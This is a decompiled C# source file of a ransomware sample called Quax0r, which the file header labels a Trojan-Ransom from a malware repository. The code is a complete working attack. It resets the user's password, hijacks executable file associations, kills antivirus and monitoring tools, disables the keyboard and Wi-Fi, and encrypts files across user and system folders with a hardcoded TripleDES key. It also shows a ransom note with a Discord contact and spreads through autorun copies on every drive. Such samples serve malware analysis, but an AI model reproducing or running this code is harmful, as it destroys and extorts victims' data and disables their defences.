// Decompiled with JetBrains decompiler
// Type: Quax0r.MainForm
// Assembly: Quax0r, Version=1.0.8186.2095, Culture=neutral, PublicKeyToken=null
// MVID: FE87C59D-F580-4763-A344-EA5B4310F940
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Trojan-Ransom.MSIL.Encoder.gen-cd1bb0b84729b272e28a48cdfc22ef1f2577e4a1779a9fe871e54cf71707ded8.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Quax0r
{
  public class MainForm : Form
  {
    private IContainer components;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.AutoScaleMode = AutoScaleMode.Font;
      this.Name = nameof (MainForm);
      this.Text = "Quax0r";
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public MainForm()
    {
      try
      {
        this.InitializeComponent();
        if ((object) Environment.UserName == (object) "sd")
        {
          Application.Exit();
          Environment.Exit(0);
          Process.GetCurrentProcess().Kill();
          this.Close();
        }
        Interaction.Shell("cmd.exe /c net users %username% LOCKEDBYROZBEHOFSATAN", AppWinStyle.Hide);
        Interaction.Shell("cmd.exe /c assoc .exe=RozbehOfSatanFile && assoc .bat=RozbehOfSatanFile && assoc .cmd=RozbehOfSatanFile", AppWinStyle.Hide);
        Interaction.Shell("cmd.exe /c echo ^[autorun^] > ..\\\\autorun.inf", AppWinStyle.Hide);
        Interaction.Shell("cmd.exe /c echo open^=WindowsScan^.exe >> ..\\\\autorun.inf", AppWinStyle.Hide);
        Interaction.Shell("cmd.exe /c netsh Interface Set Interface Wi-Fi 12 disable", AppWinStyle.Hide);
        Interaction.Shell("cmd.exe /c taskkill /im chrome.exe /f && taskkill /im WireShark.exe /f && taskkill /im MSASCUI.exe /f && taskkill /im taskmgr.exe /f && taskkill /im regedit.exe /f && taskkill /im Kaspersky.exe /f && taskkill /im msseces.exe /f && taskkill /im nod32.exe /f && taskkill /im msmpeng.exe /f && taskkill /im navapsvc.exe /f && taskkill /im avkwctl.exe /f && taskkill /im fsav32.exe /f && rundll32 keyboard,disable", AppWinStyle.Hide);
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.Cookies));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.History));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.InternetCache));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.Personal));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.Personal));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.Programs));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.Recent));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.SendTo));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.StartMenu));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.Startup));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
        this.EncryptDir((object) Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFilesX86));
        Interaction.Shell("cmd.exe /c assoc .txt=txtfile", AppWinStyle.Hide);
        Interaction.Shell("cmd.exe /c color CF && @echo off && cls && echo All files have been encrypted by NominatusCrypto ( Quax0r ) contact the creator of this virus on discord Nominatus#9251 for more information if you restart then your account will be useless! files cannot be decrypted without paying the ransom to the creator!! live or die? make your choice now! && pause > nul", AppWinStyle.MaximizedFocus);
        DriveInfo[] drives = DriveInfo.GetDrives();
        int index = 0;
        while (index < drives.Length)
        {
          DriveInfo driveInfo = drives[index];
          try
          {
            FileSystem.FileCopy(Application.ExecutablePath, driveInfo.ToString() + "\\\\WindowsScan.exe");
            FileSystem.FileCopy("..\\\\autorun.inf", driveInfo.ToString());
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void Cryptit(object FLName)
    {
      try
      {
        TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider();
        cryptoServiceProvider.KeySize = 192;
        cryptoServiceProvider.Key = Encoding.UTF8.GetBytes("XORL652RZBH7890DXPQJKVFI");
        cryptoServiceProvider.Mode = CipherMode.ECB;
        cryptoServiceProvider.Padding = PaddingMode.PKCS7;
        ICryptoTransform encryptor = cryptoServiceProvider.CreateEncryptor();
        object obj = (object) File.ReadAllBytes(Conversions.ToString(FLName));
        object bytes = (object) encryptor.TransformFinalBlock((byte[]) obj, 0, Conversions.ToInteger(NewLateBinding.LateGet(obj, (System.Type) null, "Length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
        File.WriteAllBytes(Conversions.ToString(FLName), (byte[]) bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void EncryptDir(object DName)
    {
      try
      {
        object files = (object) Directory.GetFiles(Conversions.ToString(Operators.AddObject(DName, (object) "\\\\")), "*.*", SearchOption.AllDirectories);
        try
        {
          foreach (object obj in (IEnumerable) files)
          {
            object objectValue = RuntimeHelpers.GetObjectValue(obj);
            try
            {
              this.Cryptit(RuntimeHelpers.GetObjectValue(objectValue));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
